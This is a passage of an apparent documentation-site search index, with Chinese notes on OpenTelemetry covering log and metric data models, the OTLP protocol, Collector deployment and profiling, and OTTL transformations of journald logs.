\u4e2d\u6709\u6570\u636e\u7c7b\u578b\u89c4\u8303\uff09\u3002\u89c4\u8303\u4e2d\u6709\u5f88\u5927\u7bc7\u5e45\u8bb2\u89e3\u8bbe\u8ba1\u7684\u539f\u56e0\u548c\u80cc\u666f\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\uff0c\u611f\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u67e5\u770b\u539f\u6587\u3002\u8fd9\u91cc\u7b80\u5355\u4e3e\u5176\u4e2d\u4e00\u4e9b\u5b57\u6bb5\u4f5c\u4e3a\u4f8b\u5b50\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#log","title":"Log","text":"Field Name Type Description Timestamp uint64 Time when the event occurred. ObservedTimestamp uint64 Time when the event was observed. SeverityText string The severity text (also known as log level). SeverityNumber number Numerical value of the severity. Body any The body of the log record. Resource Resource Describes the source of the log. InstrumentationScope Instrumentation Scope Describes the scope that emitted the log. Attributes map Additional information about the event. <p>\u5982\u679c\u5bf9\u5b57\u6bb5\u7684\u8bed\u4e49\u6709\u56f0\u60d1\uff0c\u53ef\u4ee5\u53bb\u67e5\u6587\u6863\u548c GitHub \u4e0a\u7684\u8ba8\u8bba\u3002</p> <p>Example</p> <pre><code>ObservedTimestamp: 2024-10-04 15:46:26.809948211 +0000 UTC\nTimestamp: 2024-10-04 15:46:14 +0000 UTC\nSeverityText: notice\nSeverityNumber: Info2(10)\nBody: Str(&lt;189&gt;Oct  4 23:46:14 Huawei %%01SHELL/5/CMDRECORD[l](324):Record command information. (Task=vt0, Ip=192.168.1.178, User=admin, Command=\"log off (ssh user)\", Result=Success) )\nAttributes:\n    -&gt; net.host.port: Str(514)\n    -&gt; net.peer.name: Str(192.168.1.1)\n    -&gt; appname: Str(%%01SHELL/5/CMDRECORD(l))\n</code></pre> <p>OpenTelemetry \u7684\u65e5\u5fd7\u5c1a\u5904\u4e8e\u65e9\u671f\u9636\u6bb5\uff0c\u5f88\u591a\u8bed\u4e49\u7ea6\u5b9a\u8fd8\u6ca1\u6709\u89c4\u8303\u5316\u3002\u9644\u5f55 Appendix A. Example Mappings \u5c55\u793a\u4e86\u4e00\u4e9b\u5e38\u89c1\u65e5\u5fd7\u683c\u5f0f\u7684\u6620\u5c04\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u65e5\u5fd7\u4e2d\u7ed3\u6784\u5316\u7684\u90e8\u5206\u5e94\u5f53\u5c3d\u53ef\u80fd\u63d0\u53d6\u5230 Body \u4e4b\u5916\u7684\u5730\u65b9\u4f5c\u4e3a\u5143\u6570\u636e\uff08\u6bd4\u5982 Resource \u548c Attributes\uff09\uff0cBody \u53ea\u5269\u4e0b\u6587\u672c\u4fe1\u606f\u3002Distinction between structured <code>Body</code> and <code>Attributes</code> \u00b7 Issue #1613 \u00b7 open-telemetry/opentelemetry-specification \u5bf9 <code>Body</code> \u5b57\u6bb5\u7684\u4f7f\u7528\u505a\u7684\u8be6\u7ec6\u7684\u8ba8\u8bba\uff0c\u6700\u7ec8\u7ed9\u51fa\u4e86\u5982\u4e0b\u7684\u5efa\u8bae\uff1a</p> <ul> <li>OTel \u89c4\u8303\u4ecd\u4f1a\u4fdd\u6301 <code>Body</code> \u7c7b\u578b\u4e3a <code>any</code>\uff0c\u4ee5\u517c\u5bb9\u5404\u79cd\u65e5\u5fd7\u683c\u5f0f\uff0c\u6ee1\u8db3\u65e0\u635f\u8f6c\u6362\u7684\u8981\u6c42\u3002</li> <li>\u73b0\u6709\u7684\u6240\u6709\u65e5\u5fd7\u5e93\u4ea7\u751f\u7684\u65e5\u5fd7\u6d88\u606f\u4f53\uff08message\uff09\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u9650\u5236\u65e5\u5fd7 API \u4ec5\u63a5\u53d7 <code>Body</code> \u4e3a\u5b57\u7b26\u4e32\uff0c\u7ed3\u6784\u5316\u6570\u636e\u5e94\u5f53\u8fdb\u5165 <code>Attributes</code>\u3002</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#metrics","title":"Metrics","text":"<p>Metrics \u672c\u8d28\u4e0a\u6765\u81ea\u4e8b\u4ef6\u3002OTLP \u5206\u5c42\u8bbe\u8ba1\u4e86\u4e09\u4e2a\u6a21\u578b\uff1aEvents =&gt; Data Stream =&gt; Timeseries\u3002\u9ad8\u5c42\u6b21\u6a21\u578b\u6d89\u53ca\u5ea6\u91cf API \u548c\u79bb\u6563\u8f93\u5165\u503c\uff0c\u4f4e\u5c42\u6b21\u6a21\u578b\u5b9a\u4e49\u65f6\u95f4\u5e8f\u5217\u548c\u79bb\u6563\u8f93\u51fa\u503c\u3002</p> <p></p> <p></p> <p>\u65f6\u95f4\u5e8f\u5217\uff1a</p> <ul> <li>\u5143\u6570\u636e\u5c5e\u6027<ul> <li>\u6307\u6807\u540d\u79f0</li> <li>\u5c5e\u6027\uff08\u7ef4\u5ea6\uff09</li> <li>\u70b9\u7684\u503c\u7c7b\u578b\uff08\u6574\u6570\u3001\u6d6e\u70b9\u6570\u7b49\uff09</li> <li>\u6d4b\u91cf\u5355\u4f4d</li> </ul> </li> <li>\u4e3b\u8981\u6570\u636e\u662f\u6709\u5e8f\u7684\uff08\u65f6\u95f4\u6233\uff0c\u503c\uff09\u70b9\uff0c\u7c7b\u578b\u53ef\u4ee5\u662f\uff1a<ul> <li>\u8ba1\u6570\u5668\uff08\u5355\u8c03\uff0c\u7d2f\u79ef\uff09</li> <li>\u4eea\u8868</li> <li>\u76f4\u65b9\u56fe</li> <li>\u6307\u6570\u76f4\u65b9\u56fe</li> </ul> </li> </ul> <p>\u6307\u6807\u76d1\u6d4b\u7cfb\u7edf\u5e38\u89c1\u4e09\u79cd\u4fdd\u7559\u8bed\u4e49\u7684\u53d8\u6362\uff1aTemporal reaggregation\uff08\u964d\u9891\uff09\u3001Spatial reaggregatio\uff08\u964d\u7ef4\uff0c\u53bb\u9664\u6307\u6807\u4e2d\u4e0d\u5fc5\u8981\u7684\u5c5e\u6027\uff09\u3001Delta-to-Cumulative\uff08\u589e\u91cf\u548c\u7d2f\u79ef\u4e4b\u95f4\u7684\u8f6c\u6362\uff09\u3002OTel \u7684\u6240\u6709 Data Stream \u90fd\u6709\u5185\u7f6e\u7684\u805a\u5408\u51fd\u6570\u652f\u6301\u8fd9\u4e9b\u53d8\u6362\u3002</p> <p>Metric \u70b9\u7c7b\u578b\uff1a</p> <ul> <li> <p>Delta Sum</p> <p>\u200b    </p> </li> <li> <p>Cumulative Sum</p> <p></p> </li> <li> <p>Gauge</p> <p></p> </li> <li> <p>Delta Histogram</p> <p></p> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#otel-\u534f\u8baeotlp","title":"OTel \u534f\u8bae\uff08OTLP\uff09","text":"<p>Quote</p> <ul> <li>OTLP Specification - OpenTelemetry\u3002</li> </ul> <p>OTLP \u63cf\u8ff0\u4e86\u9065\u6d4b\u6570\u636e\u5728\u6570\u636e\u6e90\u3001\u4e2d\u95f4\u8282\u70b9\u548c\u540e\u7aef\u4e4b\u95f4\u7684\u7f16\u7801\u548c\u4f20\u8f93\u65b9\u5f0f\u3002</p> <ul> <li>OTLP \u534f\u8bae\u662f\u8bf7\u6c42 - \u54cd\u5e94\u5f0f\u7684\u3002\u76ee\u524d\u5b9a\u4e49\u4e86\u4e00\u79cd\u8bf7\u6c42\u548c\u4e00\u79cd\u54cd\u5e94\uff1a<code>Export</code>\u3002</li> <li>\u5fc5\u987b\u652f\u6301\u7684\u538b\u7f29\u65b9\u5f0f\u6709 <code>gzip</code> \u548c <code>none</code>\u3002</li> <li>OTLP \u76ee\u524d\u5b9a\u4e49\u4e86\u5728 gRPC\u3001HTTP/1.1 \u548c HTTP/2 \u4e0a\u7684\u5b9e\u73b0\u3002</li> </ul> OTLP \u534f\u8bae","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#protobuf","title":"ProtoBuf","text":"<p>Protocol Buffers \u7531 Google \u63d0\u51fa\uff0c\u662f\u4e00\u5957\u8bed\u8a00\u4e2d\u7acb\u3001\u5e73\u53f0\u65e0\u5173\u7684\u5e8f\u5217\u5316\u673a\u5236\u3002\u4f7f\u7528 ProtoBuf Schema \u5f88\u5bb9\u6613\u63cf\u8ff0\u6570\u636e\u7ed3\u6784\u5982\u4f55\u5e8f\u5217\u5316\u4e3a\u4e8c\u8fdb\u5236\u6d41\uff0c\u4ee5\u53ca\u5982\u4f55\u4ece\u4e8c\u8fdb\u5236\u6d41\u53cd\u5e8f\u5217\u5316\u4e3a\u6570\u636e\u7ed3\u6784\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#grpc","title":"gRPC","text":"<ul> <li>\u7aef\u53e3 <code>4317</code>\u3002</li> <li>\u5efa\u7acb gRPC \u8fde\u63a5\u540e\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528 <code>Export&lt;signal&gt;ServiceRequest</code> \u53d1\u9001\u6570\u636e\u3002</li> <li>\u670d\u52a1\u7aef\u5206\u4e09\u79cd\u60c5\u51b5\u54cd\u5e94\uff1a<ul> <li>\u5b8c\u5168\u6210\u529f\uff1a\u56de\u590d <code>Export&lt;signal&gt;ServiceResponse</code> \u6d88\u606f\uff0c\u4e0d\u8bbe\u7f6e <code>partial_success</code> \u5b57\u6bb5\u3002</li> <li>\u90e8\u5206\u6210\u529f\uff1a\u56de\u590d <code>Export&lt;signal&gt;ServiceResponse</code> \u6d88\u606f\uff0c\u8bbe\u7f6e <code>partial_success</code>\u3001\u5176\u4ed6\u63cf\u8ff0\u62d2\u7edd\u7684\u90e8\u5206\u548c\u539f\u56e0\u7684\u5b57\u6bb5\u3002\u8be5\u60c5\u51b5\u4e0b\u5ba2\u6237\u7aef\u4e0d\u5141\u8bb8\u91cd\u8bd5\u3002</li> <li>\u5931\u8d25\uff1a\u8fd9\u4e9b\u4ee3\u7801\u7531 gRPC \u89c4\u8303\u5b9a\u4e49\uff08\u72b6\u6001\u7801\u548c\u9519\u8bef\u5904\u7406\uff09\uff0cOTLP \u53ea\u662f\u8bf4\u660e\u4e86\u8fd9\u4e9b\u4ee3\u7801\u5728 OTLP \u4e2d\u7684\u542b\u4e49\u3002<ul> <li>\u53ef\u91cd\u8bd5\uff1a\u670d\u52a1\u7aef\u8fd4\u56de\u4ee3\u7801 <code>UNAVAILABLE</code>\uff0c\u5e76\u4f7f\u7528 <code>RetryInfo</code> \u63cf\u8ff0\u91cd\u8bd5\u7684\u95f4\u9694\u3002</li> <li>\u4e0d\u53ef\u91cd\u8bd5\uff1a\u670d\u52a1\u7aef\u8fd4\u56de\u4ee3\u7801 <code>INVALID_ARGUMENT</code>\uff0c\u5e76\u4f7f\u7528 <code>BadRequest</code> \u63cf\u8ff0\u9519\u8bef\u3002</li> </ul> </li> </ul> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#http11-\u548c-http2","title":"HTTP/1.1 \u548c HTTP/2","text":"<ul> <li>\u8f7d\u8377\u7f16\u7801\u4e3a\u4e8c\u8fdb\u5236\u6216 JSON \u683c\u5f0f\u3002</li> <li>\u5ba2\u6237\u7aef\u4f7f\u7528 <code>POST</code> \u8bf7\u6c42\u53d1\u9001\u6570\u636e\uff0c\u8def\u5f84\u4e3a <code>v1/&lt;signal&gt;</code> \u7b49\u3002</li> <li>\u670d\u52a1\u7aef\u5206\u4e09\u79cd\u60c5\u51b5\u54cd\u5e94\uff1a<ul> <li>\u5b8c\u5168\u6210\u529f\uff1a\u8fd4\u56de <code>200 OK</code>\u3002</li> <li>\u90e8\u5206\u6210\u529f\uff1a\u8fd4\u56de <code>200 OK</code>\uff0c\u5e76\u5728\u54cd\u5e94\u4f53\u4e2d\u63cf\u8ff0\u62d2\u7edd\u7684\u90e8\u5206\u548c\u539f\u56e0\u3002</li> <li>\u5931\u8d25\uff1a\u8fd4\u56de <code>4xx</code> \u6216 <code>5xx</code> \u72b6\u6001\u7801\uff0c\u5177\u4f53\u542b\u4e49\u7531 OTLP \u5b9a\u4e49\u3002</li> </ul> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#otel-collector-otelcol","title":"OTel Collector (otelcol)","text":"<p>Quote</p> <ul> <li>Collector - OpenTelemetry</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#collector-\u7b80\u4ecb","title":"Collector \u7b80\u4ecb","text":"<p>Collector \u4ee5\u65e0\u5173\u5382\u5546\u7684\u65b9\u5f0f\u63a5\u6536\u3001\u5904\u7406\u548c\u5bfc\u51fa\u9065\u6d4b\u6570\u636e\u3002</p> <p>Collector \u7531 Receiver\u3001Processor \u548c Exporter \u7ec4\u6210\uff0c\u6574\u4f53\u67b6\u6784\u5982\u4e0b\uff1a</p> OpenTelemetry Collector \u67b6\u6784 <ul> <li>Receiver \u548c Exporter \u7075\u6d3b\u652f\u6301 Pull \u6216 Push \u6a21\u5f0f\u3002</li> <li>Processor \u53ef\u4ee5\u5bf9\u6570\u636e\u8fdb\u884c\u8f6c\u6362\u3001\u8fc7\u6ee4\u3001\u805a\u5408\u7b49\u64cd\u4f5c\u3002</li> <li>Connector \u53ef\u4ee5\u5bf9\u6d41\u6c34\u7ebf\u8fdb\u884c\u805a\u5408\u3001\u8def\u7531\u7b49\u64cd\u4f5c\u3002</li> </ul> <p>\u76ee\u524d\uff0c\u6211\u4eec\u4e3b\u8981\u4ee5 Normalizer \u6a21\u5f0f\u90e8\u7f72\uff0c\u8d77\u5230\u5728\u6570\u636e\u6e90\u548c\u540e\u7aef\u4e4b\u95f4\u7684\u6570\u636e\u6e05\u6d17\u548c\u8f6c\u6362\u4f5c\u7528\u3002</p> Normalizer \u6a21\u5f0f <p>Collector \u7684\u63d2\u4ef6\u5206\u4e3a core \u548c contrib \u4e24\u7c7b\uff0c\u5206\u522b\u5728\u4e0d\u540c GitHub \u4ed3\u5e93\u3002Collector \u6bcf\u6b21\u53d1\u5e03\u90fd\u4f1a\u6253\u5305\u63d2\u4ef6\uff0c\u5236\u4f5c\u6210\u4e0d\u540c\u7684 distribution \u7248\u672c\u3002\u4e00\u822c\u9009\u62e9 contrib \u7248\u672c\uff0c\u56e0\u4e3a syslog\u3001journald \u7b49\u91cd\u8981\u63d2\u4ef6\u90fd\u5728 contrib \u4ed3\u5e93\u4e2d\u3002</p> <p>Collector \u9ed8\u8ba4\u63d0\u4f9b\u81ea\u8eab\u7684\u53ef\u89c2\u6d4b\u6027\uff1a<code>8888</code> \u7aef\u53e3\u66b4\u9732\u4e86 Prometheus metric \u63a5\u53e3\uff0c\u65e5\u5fd7\u8f93\u51fa\u5230 <code>stderr</code>\u3002Collector \u901a\u8fc7 systemd \u7ba1\u7406\uff0c\u65e5\u5fd7\u4e5f\u53ef\u4ee5\u901a\u8fc7 journald \u6536\u96c6\u3002</p> <p>Tip</p> <p>\u4f7f\u7528 otelbin.io \u53ef\u4ee5\u53ef\u89c6\u5316 Collector \u914d\u7f6e\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#collector-\u90e8\u7f72","title":"Collector \u90e8\u7f72","text":"<p>\u6839\u636e\u6211\u4eec\u7684\u9700\u6c42\uff0c\u9009\u62e9 agent + gateway \u90e8\u7f72\u6a21\u5f0f\u3002\u6240\u6709\u8282\u70b9\u5747\u90e8\u7f72 systemd \u7ef4\u62a4\u7684 otelcol \u4f5c\u4e3a agent\uff0c\u7ba1\u7406\u8282\u70b9\u4e0a\u90e8\u7f72 otelcol Docker \u4f5c\u4e3a gateway\u3002</p> <pre><code>flowchart TD\n subgraph s1[\"cloud.region\"]\n    n8[\"Infrastructure\"]\n    n1([\"agent\"])\n    subgraph s3[\"host.name\"]\n     n7([\"agent\"])\n     n6[\"service.name\"]\n    end\n    subgraph s2[\"host.name\"]\n     n5[\"service.name\"]\n     n4([\"agent\"])\n     n2[\"service.name\"]\n    end\n end\n n3([\"gateway\"])\n n5 --&gt; n4\n n2 --&gt; n4\n n6 --&gt; n7\n n7 --&gt; n1\n n4 --&gt; n1([\"gateway\"])\n n1([\"gateway(cluster)\"]) --&gt; n3([\"gateway(final)\"])\n n8[\"Infrastructure\"] --&gt; n1\n</code></pre> <p> OpenTelemetry Collector Deployment Patterns \u8fd8\u63cf\u8ff0\u4e86\u57fa\u672c\u3001\u6247\u51fa\uff08Fanout\uff09\u3001\u89c4\u8303\u5316\uff08Normalizer\uff09\u3001\u8d1f\u8f7d\u5747\u8861\u3001\u591a\u96c6\u7fa4\u3001\u591a\u79df\u6237\u7b49\u90e8\u7f72\u6a21\u5f0f\u3002</p> <p>Collector \u53ef\u4ee5\u4f7f\u7528 OpAMP \u534f\u8bae\u7ba1\u7406\uff0cOpenTelemetry \u4e5f\u63d0\u4f9b\u4e86\u7b80\u5355\u7684  OpAMP Go \u5b9e\u73b0\u3002\u56e0\u4e3a\u8be5\u534f\u8bae\u76ee\u524d\u5904\u4e8e Beta \u9636\u6bb5\uff0c\u6240\u4ee5\u6211\u4eec\u6682\u65f6\u6ca1\u6709\u4f7f\u7528\u3002\u7b49\u5230\u534f\u8bae\u5e94\u7528\u6210\u719f\uff0c\u6211\u4eec\u5e94\u5f53\u4f7f\u7528 OpAMP \u4f5c\u4e3a\u4e2d\u5fc3\u5316\u7684\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\uff0c\u4e0b\u53d1\u914d\u7f6e\u6587\u4ef6\u548c\u76d1\u6d4b Collector \u8fd0\u884c\u72b6\u6001\u3002</p> <p>\u90e8\u7f72\u4e3a Agent + Gateway \u6a21\u5f0f\u65f6\uff0c\u6570\u636e\u5904\u7406\u7684\u4f4d\u7f6e\u6709\u591a\u79cd\u9009\u62e9\u3002ClickHouse \u5b98\u65b9\u7684\u5efa\u8bae\u662f\uff1a\u5728 gateway \u548c ClickHouse \u4e2d\u505a\u8f6c\u6362\u548c\u5904\u7406\uff0c\u5c3d\u91cf\u51cf\u5c11 agent \u5b9e\u4f8b\u4e0a\u7684\u5de5\u4f5c\u3002</p> <p>\u901a\u5e38\uff0c\u6211\u4eec\u53ea\u5728 agent \u4e0a\u6267\u884c\u8fc7\u6ee4\u3001\u65f6\u95f4\u6233\u8bbe\u7f6e\u548c\u6dfb\u52a0\u5c5e\u6027\u64cd\u4f5c\u3002</p> <p>We recommend users avoid doing excessive event processing using operators or transform processors. These can incur considerable memory and CPU overhead, especially JSON parsing. It is possible to do all processing in ClickHouse at insert time with materialized views and columns with some exceptions - specifically, context-aware enrichment e.g. adding of k8s metadata. For more details see \"Extracting structure with SQL\".</p> <p>If processing is done using the OTel collector, we recommend doing transformations at gateway instances and minimizing any work done at agent instances. This will ensure the resources required by agents at the edge, running on servers, are as minimal as possible. Typically, we see users only performing filtering (to minimize unnecessary network usage), timestamp setting (via operators), and enrichment, which requires context in agents. For example, if gateway instances reside in a different Kubernetes cluster, k8s enrichment will need to occur in the agent.</p> <p>\u6211\u4eec\u6709\u8de8\u7f51\u7ad9\u4f20\u8f93\u9065\u6d4b\u6570\u636e\u7684\u9700\u6c42\uff08\u4ece mirror \u5230 cluster\uff09\uff0c\u914d\u7f6e\u4e86\u4ee5\u4e0b\u5b89\u5168\u63aa\u65bd\uff1a</p> <ul> <li>\u4f7f\u7528 TLS \u8bc1\u4e66\u8fdb\u884c HTTPS \u901a\u4fe1\u3002</li> <li>\u4f7f\u7528 bearer token \u8fdb\u884c\u8ba4\u8bc1\u3002</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#collector-\u6027\u80fd\u5206\u6790\u4e0e\u8c03\u8bd5","title":"Collector \u6027\u80fd\u5206\u6790\u4e0e\u8c03\u8bd5","text":"<p>\u4f5c\u4e3a\u6570\u636e\u96c6\u6563\u7684\u67a2\u7ebd\uff0cCollector \u7684\u6027\u80fd\u81f3\u5173\u91cd\u8981\u3002OpenTelemetry \u5f88\u5173\u5fc3\u8fd9\u4e00\u70b9\uff0c\u5bf9\u6bcf\u6b21 Git \u63d0\u4ea4\u90fd\u4f1a\u81ea\u52a8\u8fd0\u884c\u57fa\u51c6\u6d4b\u8bd5\uff0c\u7ed3\u679c\u89c1 benchmarks/loadtests\u3002</p> <p>Collector \u81ea\u8eab\u63d0\u4f9b pprof \u63d2\u4ef6\uff0c\u53ef\u4ee5\u8fdb\u884c\u6027\u80fd\u5206\u6790\u3002\u53ef\u4ee5\u67e5\u770b <code>http://localhost:1778/debug/pprof/</code> \u4e86\u89e3\u57fa\u672c\u60c5\u51b5\u3002\u5e0c\u671b\u6df1\u5165\u4e86\u89e3 Go pprof \u7684\u540c\u5b66\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684\u8d44\u6599\uff1a</p> <ul> <li> Profiling Go Code with pprof</li> <li> Production-Go-Examples</li> <li>Profiling Go programs with pprof - Julia Evans</li> </ul> <p>\u6b64\u5916\u8fd8\u6709 zpages \u63d2\u4ef6\uff0c\u63d0\u4f9b\u8bca\u65ad\u4fe1\u606f\u3002\u53ef\u4ee5\u67e5\u770b <code>http://localhost:55680/debug/servicez</code> \u4e86\u89e3\u57fa\u672c\u60c5\u51b5\u3002\u5e0c\u671b\u6df1\u5165\u4e86\u89e3 zpages \u7684\u540c\u5b66\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684\u8d44\u6599\uff1a</p> <ul> <li> ZPages in OpenTelemetry</li> </ul> <p>\u5173\u4e8e Collector \u548c\u5176\u4ed6\u4ea7\u54c1\u7684\u6bd4\u8f83\uff0c\u53ef\u4ee5\u81ea\u5df1\u5199\u57fa\u4e8e Docker \u7684\u57fa\u51c6\u6d4b\u8bd5\u3002\u53ef\u89c2\u6d4b\u6027#\u6848\u4f8b\u8c03\u7814 \u4e2d\u4e5f\u6709\u4e00\u4e9b\u53c2\u8003\u8d44\u6599\u3002\u6211\u4eec\u8fdb\u884c\u4e86 Filebeat \u548c OTel Collector \u7684\u6bd4\u8f83\uff0c\u4ec5\u5f00\u542f json \u89e3\u6790\u5668\u5bf9\u6587\u4ef6\u65e5\u5fd7\u8fdb\u884c\u89e3\u6790\u65f6\uff1a</p> <ul> <li>Filebeat \u5904\u7406\u65e5\u5fd7\u65f6 CPU \u5360\u7528\u8f83\u9ad8\uff0c\u95f2\u65f6 CPU \u5360\u7528\u7387\u4f4e\uff0c\u5185\u5b58\u5360\u7528\u7a33\u5b9a\u504f\u9ad8\u3002</li> <li>OTel Collector \u5904\u7406\u65e5\u5fd7\u65f6 CPU \u5360\u7528\u8f83\u4f4e\uff0c\u95f2\u65f6 CPU \u5360\u7528\u76f8\u5bf9\u8f83\u9ad8\uff0c\u5185\u5b58\u5360\u7528\u7a33\u5b9a\u504f\u4f4e\u3002</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#\u5b50\u7ec4\u4ef6pkgottl","title":"\u5b50\u7ec4\u4ef6\uff1apkg/ottl","text":"<p><code>pkg/ottl</code> \u5b9e\u73b0\u4e86 OTel Transformation Language\uff08OTTL\uff09\uff0c\u7528\u4e8e\u5904\u7406\u548c\u8f6c\u6362\u9065\u6d4b\u6570\u636e\u3002Transform Processor \u7684\u914d\u7f6e\u57fa\u4e8e\u8be5\u79cd\u8bed\u8a00\uff0c\u5b9e\u73b0\u7684\u529f\u80fd\u6bd4 <code>pkg/stanza</code> \u66f4\u5f3a\u5927\u3002</p> <p>Example</p> <p>\u4e0b\u9762\u6211\u4eec\u4ee5\u4e00\u4e2a\u5177\u4f53\u7684\u60c5\u5883\u4e3a\u4f8b\u4ecb\u7ecd OTTL\u3002\u5047\u8bbe\u4f60\u9700\u8981\u5bf9\u4e0b\u9762\u7684 Log \u8fdb\u884c\u5904\u7406\uff1a</p> <pre><code>{\n    \"body\": {\n        \"MESSAGE\": \"Something happened.\",\n        \"_PID\": 12345,\n        \"_TRANSPORT\": \"kernel\",\n        \"foo\": \"bar\",\n        \"baz\": \"qux\"\n    }\n}\n</code></pre> <p>\u8981\u6c42\u5c06 <code>body</code> \u66ff\u6362\u4e3a <code>MESSAGE</code>\uff0c\u7279\u5b9a\u952e\u503c\u5bf9\u79fb\u52a8\u5230 <code>resource</code>\uff0c\u5176\u4f59\u952e\u503c\u5bf9\u79fb\u52a8\u5230 <code>attributes</code> \u4e2d\uff0c\u5e76\u6dfb\u52a0\u524d\u7f00 <code>journald.*</code>\uff08\u5728\u524d\u6587\u6211\u4eec\u77e5\u9053\u8fd9\u4ee3\u8868 OTel \u5c5e\u6027\u7684\u547d\u540d\u7a7a\u95f4\uff09\uff1a</p> <pre><code>{\n    \"body\": \"Something happened.\",\n    \"attributes\": {\n        \"journald._TRANSPORT\": \"kernel\",\n        \"journald.foo\": \"bar\",\n        \"journald.baz\": \"qux\"\n    },\n    \"resource\": {\n        \"process.pid\": 12345\n    }\n}\n</code></pre> <p>\u5927\u81f4\u601d\u8def\u662f\uff1a</p> <ul> <li>\u5728 Receiver \u5904\uff1a<ul> <li>\u4f7f\u7528 <code>move</code> Operator \u5c06 <code>body</code> \u79fb\u52a8\u5230 <code>attributes.journald</code>\u3002</li> <li>\u4f7f\u7528 <code>move</code> Operator \u5c06 <code>MESSAGE</code> \u7b49\u6709\u660e\u786e\u76ee\u7684\u7684\u5b57\u6bb5\u79fb\u52a8\u5230\u76f8\u5e94\u4f4d\u7f6e\u3002</li> </ul> </li> <li>\u5728 Processor \u5904\uff1a<ul> <li>\u4f7f\u7528 <code>flatten</code> Function \u5c06 <code>attributes[\"*\"]</code> \u7684\u952e\u540d\u79f0\u653e\u5165\u547d\u540d\u7a7a\u95f4 <code>attributes[\"journald.*\"]</code>\uff08\u5176\u5b9e\u5c31\u662f\u5229\u7528 <code>flatten</code> \u6dfb\u52a0\u524d\u7f00\u7684\u529f\u80fd\uff0c\u5e76\u6ca1\u6709\u5c55\u5e73\u5d4c\u5957\uff09\u3002</li> </ul> </li> </ul> <ul> <li> <p>\u5728 OTel \u89c4\u8303\uff1a\u57fa\u672c\u6982\u5ff5 \u4e2d\uff0c\u6211\u4eec\u63d0\u5230\u4e0d\u540c\u9065\u6d4b\u6570\u636e\u7684\u5b57\u6bb5\u5b9a\u4e49\uff08\u6570\u636e\u7c7b\u578b\uff09\u53ef\u80fd\u4e0d\u540c\u3002OTTL \u5b9a\u4e49\u4e0d\u540c\u9065\u6d4b\u6570\u636e\u7684\u4e0a\u4e0b\u6587\uff08Context\uff09\uff0c\u9650\u5236\u5982\u4f55\u8bbf\u95ee\u9065\u6d4b\u6570\u636e\u7684\u5404\u4e2a\u5b57\u6bb5\u3002</p> <ul> <li> <p>Log \u4e0a\u4e0b\u6587\uff1a</p> <p>pdata \u662f Collector Pipeline Data\uff0c\u5373 Collector \u5185\u90e8\u6d41\u6c34\u7ebf\u4e2d\u7684\u6570\u636e\u8868\u793a\u683c\u5f0f\u3002Log Context \u9488\u5bf9 pdata.LogRecord \u5b9a\u4e49\u3002\u9605\u8bfb\u6587\u6863\u6211\u4eec\u4e86\u89e3\u5230\u76f8\u5173\u5b57\u6bb5\u5982\u4e0b\uff1a</p> \u5b57\u6bb5\u540d \u7c7b\u578b <code>resource</code> <code>pcommon.Resource</code> <code>resource.attributes</code> <code>pcommon.Map</code> <code>resource.attribute[\"\"] |</code>string<code>\u3001</code>bool<code>\u3001</code>pcommon.Map`\u3001... <code>attributes</code> <code>pcommon.Map</code> <code>attributes[\"\"]</code> <code>string</code>\u3001<code>bool</code>\u3001<code>pcommon.Map</code>\u3001... <code>body</code> any <code>body[]</code> <code>string</code>\u3001<code>bool</code>\u3001<code>pcommon.Map</code>\u3001... <code>body[\"\"]</code> <code>string</code>\u3001<code>bool</code>\u3001<code>pcommon.Map</code>\u3001... </li> </ul> </li> <li> <p>OTTL Functions \u80fd\u591f\u64cd\u7eb5 pdata \u6570\u636e\u3002\u4e3b\u8981\u6709\u4e24\u7c7b\u51fd\u6570\uff1a</p> <ul> <li>Editors\uff1a\u4fee\u6539\u9065\u6d4b\u6570\u636e\u3002\u5982 <code>append</code>\u3001<code>delete_key</code>\u3001<code>flatten</code> \u7b49\u3002</li> <li>Converters\uff1a\u4ec5\u7528\u4e8e\u8f6c\u6362\uff0c\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u4e0d\u4fee\u6539\u8f93\u5165\u6570\u636e\u3002\u5982 <code>IsInt</code>\u3001<code>Day</code> \u7b49\u3002</li> </ul> <p><code>flatten</code> \u51fd\u6570</p> <pre><code>flaten(target, Optional[prefix], Optional[depth])\n</code></pre> <p>\u51fd\u6570\u4f5c\u7528\u4e8e <code>pcommon.Map</code>\u3002</p> </li> </ul> <p>\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5199\u51fa\u5728 Processor \u4e2d\u9700\u8981\u4f7f\u7528\u7684 OTTL \u8bed\u53e5\uff1a</p> <pre><code>logs:\n  flatten(attributes, \"journald\")\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#\u5b50\u7ec4\u4ef6pkgstanza","title":"\u5b50\u7ec4\u4ef6\uff1apkg/stanza","text":"<p><code>pkg/stanza</code> \u662f\u7528\u4e8e\u5904\u7406\u4f20\u7edf\u65e5\u5fd7\u7684\u6a21\u5757\uff0c\u5f88\u591a\u65e5\u5fd7 Receiver \u90fd\u57fa\u4e8e\u5b83\u6784\u5efa\uff0c\u6211\u4eec\u4e5f\u5e38\u5e38\u9700\u8981\u4f7f\u7528\u5176\u4e2d\u7684 